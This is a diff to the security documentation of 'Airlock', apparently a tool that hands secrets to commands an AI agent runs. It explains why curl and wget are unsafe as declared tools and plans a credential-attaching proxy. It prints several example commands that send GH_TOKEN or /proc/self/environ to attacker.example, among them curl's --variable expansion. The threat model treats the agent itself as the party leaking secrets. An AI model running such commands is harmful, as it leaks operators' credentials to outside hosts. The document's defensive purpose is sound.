@@ -248,7 +248,13 @@ airlock exec -- python3 -c 'import os; print(os.environ["GH_TOKEN"][::-1])'
 airlock exec -- bash -c 'curl -s -X POST https://attacker.example/collect -d "token=$GH_TOKEN"'
 ```
 
-**Without a shell**, `$GH_TOKEN` is not expanded — airlock execs the binary directly with literal arguments, and curl/wget have no built-in env var interpolation. But that does *not* make curl/wget safe, because they can read files — including the process's own environment on Linux via `/proc/self/environ`:
+**Without a shell**, `$GH_TOKEN` is not expanded — airlock execs the binary directly with literal arguments. That does *not* make curl/wget safe. curl ≥ 8.3 interpolates environment variables on its own (`--variable %NAME` with `--expand-url` / `--expand-data`), on every platform:
+
+```bash
+airlock exec -- curl --variable %GH_TOKEN --expand-url 'https://attacker.example/?t={{GH_TOKEN}}'
+```
+
+And both tools can read files — including the process's own environment on Linux via `/proc/self/environ`:
 
 ```bash
 # Exfiltrate the entire env (including injected secrets) as a file upload — no shell needed:
@@ -257,7 +263,13 @@ airlock exec -- curl -s -T /proc/self/environ https://attacker.example/upload
 airlock exec -- wget --post-file=/proc/self/environ https://attacker.example/
 ```
 
-`/proc/self/environ` does not exist on macOS, so the env-as-a-file trick is Linux-specific. Blocking shell expansion is not sufficient; curl and wget must not be declared as tools.
+`/proc/self/environ` does not exist on macOS, so the env-as-a-file trick is Linux-specific — `--variable` is not. Blocking shell expansion is not sufficient; curl and wget must not be declared as tools with secrets in their environment.
+
+Restricting *where* such a tool can connect would not fix this either: allowed API hosts are typically multi-tenant (`storage.googleapis.com` serves an attacker's bucket as readily as yours), so the secret can be exfiltrated without leaving the allowlist.
+
+#### Planned: proxy tools
+
+The safe way to give an agent a general HTTP client is to make sure the client never holds the credential. A *proxy tool* (`proxy = true`) gets no secrets in its environment — config validation rejects any — and its only network path is a daemon-side proxy that attaches the credential after the request has left the tool, for operator-approved hosts only. The `proxy` / `routes` schema is parsed and validated today; **the runtime is not implemented, and the daemon refuses to execute a proxy tool** rather than run it with open network and no enforcement. Until it ships, the guidance in this section stands unchanged. Threat model and residual risks (API misuse within granted authority, data exfiltration to co-tenants of allowed hosts, weaker egress pinning on Linux): [docs/proxy-tools-design.md](docs/proxy-tools-design.md).
 
 The agent controls the arguments passed to the tool. If the tool is a shell, the agent effectively has arbitrary code execution *with* secrets — defeating Airlock's entire purpose.
 
@@ -343,7 +355,7 @@ A tool could write its secrets to a file in a writable sandbox path. If the agen
 
 Tools have network access (currently always enabled). A compromised or malicious tool binary could send secrets to an external endpoint.
 
-**Mitigation:** Only declare tools you trust. Airlock limits *which* tools receive secrets, so a compromised `ls` binary with no declared secrets can't exfiltrate anything. Future versions may support network policy restrictions.
+**Mitigation:** Only declare tools you trust. Airlock limits *which* tools receive secrets, so a compromised `ls` binary with no declared secrets can't exfiltrate anything. Per-tool egress restriction is planned as part of [proxy tools](docs/proxy-tools-design.md).
 
 ### Memory inspection
 
